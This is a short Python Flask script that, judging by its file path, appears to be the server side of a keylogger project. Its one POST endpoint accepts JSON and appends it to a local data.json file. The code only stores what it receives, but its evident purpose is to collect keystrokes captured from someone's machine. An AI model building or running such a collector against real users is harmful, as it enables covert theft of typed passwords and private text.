from flask import Flask, jsonify, request
import os
import json

app = Flask(__name__)

@app.route('/save_data',methods=['POST'])
def receive():
    data = request.get_json()


    file_name = r"C:\Users\gabim\Programing\keylogger\server\data.json"
    if not os.path.exists(file_name) or os.path.getsize(file_name) == 0:
        logs = {}
    else:
        with open(file_name, "r") as file:
            logs = json.load(file)

    key = list(data)[0]
    logs[key] = data[key]

    with open(file_name, "w") as file:
        json.dump(logs, file, indent=4)

    return jsonify({"status": "success", "data": data}), 200

        



if __name__== "__main__":
    app.run(debug=True)